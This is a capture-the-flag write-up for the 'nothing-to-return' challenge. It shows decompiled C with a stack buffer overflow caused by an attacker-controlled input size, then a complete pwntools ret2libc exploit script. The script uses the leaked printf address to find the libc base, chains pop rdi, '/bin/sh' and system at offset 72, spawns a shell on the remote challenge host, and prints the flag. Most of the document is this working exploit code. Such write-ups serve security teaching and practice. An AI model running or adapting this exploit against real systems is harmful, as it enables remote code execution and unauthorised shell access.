# nothing-to-return
Now this challenge has a binary of a very small size.

"The binary has no useful gadgets! There is just nothing to return to!"

nice try... ntr

Author: drec

nc 34.30.126.104 5000

| [nothing-to-return](/nothing-to-return) | [libc.so.6](/libc.so.6) | [ld-linux-x86-64.so.2](/ld-linux-x86-64.so.2) |

## Approach
Taking a look at the decompiled binary.

### main
```
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char local_48 [64];
  
  init(param_1);
  printf("printf is at %p\n",printf);
  puts("Hello give me an input");
  get_input(local_48);
  puts("I\'m returning the input:");
  puts(local_48);
  return 0;
}
```
### get_input
```
void get_input(void *param_1)

{
  size_t size;
  char *local_10;
  
  puts("Input size:");
  __isoc99_scanf("%lu[^\n]",&size);
  local_10 = (char *)calloc(1,size);
  fgets(local_10,(int)size,stdin);
  puts("Enter your input:");
  fgets(local_10,(int)size,stdin);
  memcpy(param_1,local_10,size);
  free(local_10);
  return;
}
```
No win function, but here we can use a `ret2libc` attack. So basically we need to call `system` function within the libc that is provided with the argument `/bin/sh` to pop a shell.

## Exploit
```
#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './nothing-to-return'
elf = context.binary = ELF(exe, checksec=True)
libc = 'libc.so.6'
ld = 'ld-linux-x86-64.so.2'
libc = ELF(libc, checksec=True)
context.log_level = 'debug'
host, port = '34.30.126.104', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+108
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    
    # gather info
    ret = 0x40101a
    io.recvuntil(b'at ')
    printf_addr = io.recvuntil(b'\n').strip()
    printf_addr = int(printf_addr, 16)

    libc.address = printf_addr - libc.sym['printf']

    # setting fgets input size
    io.sendlineafter(b':', b'500')

    # setting up the payload
    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh'))

    pop_rdi = 0x28265 + libc.address

    # summarizing
    log.success("Print addr: %#x", printf_addr)
    log.success("Libc base addr: %#x", libc.address)
    log.success("System addr: %#x", system)
    log.success("/bin/sh addr: %#x", binsh)
    log.success("pop rdi addr: %#x", pop_rdi)

    # sending payload
    offset = 72
    payload = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })

    io.sendlineafter(b':', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```

## Flag
```
uoftctf{you_can_always_return}
```